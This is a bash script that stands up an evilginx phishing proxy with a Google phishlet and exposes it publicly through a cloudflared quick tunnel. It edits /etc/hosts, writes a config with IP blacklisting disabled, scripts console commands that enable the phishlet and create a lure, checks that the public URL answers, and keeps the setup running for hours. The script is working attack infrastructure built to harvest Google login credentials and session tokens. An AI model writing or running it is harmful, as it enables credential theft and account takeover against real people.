#!/usr/bin/env bash
set -euo pipefail
LIMIT=${RUN_LIMIT_MINUTES:-270}
PHISHLETS_DIR="$(pwd)/phishlets"
EVILGINX=/usr/local/bin/evilginx
CLOUDFLARED=/usr/local/bin/cloudflared
if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi

pkill -f evilginx 2>/dev/null || true

echo "--- phase 1: get tunnel url ---"
nohup "$CLOUDFLARED" tunnel --url https://127.0.0.1:443 --no-tls-verify > cloudflared.log 2>&1 &
URL=""
for i in $(seq 1 60); do
  URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
  [ -n "$URL" ] && break
  sleep 2
done
[ -n "$URL" ] && echo "PHISH_URL=$URL" || { echo "NO_TUNNEL_URL_FOUND"; tail -n 30 cloudflared.log; }
HOST="${URL#https://}"

echo "--- phase 2: hosts pin + tunnel with real SNI $HOST ---"
$SUDO sh -c "echo '127.0.0.1 $HOST' >> /etc/hosts"
pkill -f cloudflared 2>/dev/null || true
sleep 2
nohup "$CLOUDFLARED" tunnel --url "https://$HOST:443" --no-tls-verify > cloudflared.log 2>&1 &
sleep 3

echo "--- evilginx: full setup incl. lure hostname ---"
$SUDO mkdir -p /root/.evilginx
echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$HOST\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
rm -f /tmp/eg_in; mkfifo /tmp/eg_in
( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config autocert off"; sleep 1; echo "phishlets hostname google $HOST"; sleep 1; echo "phishlets enable google"; sleep 1; echo "lures create google"; sleep 1; echo "lures edit 0 hostname $HOST"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &

EG=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/443) 2>/dev/null; then exec 3>&-; EG=1; break; fi
  sleep 2
done
echo "EVILGINX_443=$EG"
sleep 12

echo "--- lure + hostname state ---"
grep -iE 'created lure|hostname set to|lure' evilginx.log | tail -n 6 || true
echo "--- backend openssl (SNI=$HOST) ---"
( echo | timeout 12 openssl s_client -connect 127.0.0.1:443 -servername "$HOST" 2>&1 | grep -iE 'CONNECTED|subject=|issuer=|CN =|Verify result|alert|error' ) || echo "NO_BACKEND_TLS"
echo "--- edge probe ---"
curl -sS -m 20 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
head -c 200 /tmp/edge.out 2>/dev/null || true
echo ""

echo "=== streaming evilginx output ==="
trap 'kill %3 %2 %1 2>/dev/null || true' EXIT
for i in $(seq 1 "$((LIMIT * 6))"); do sleep 10; done
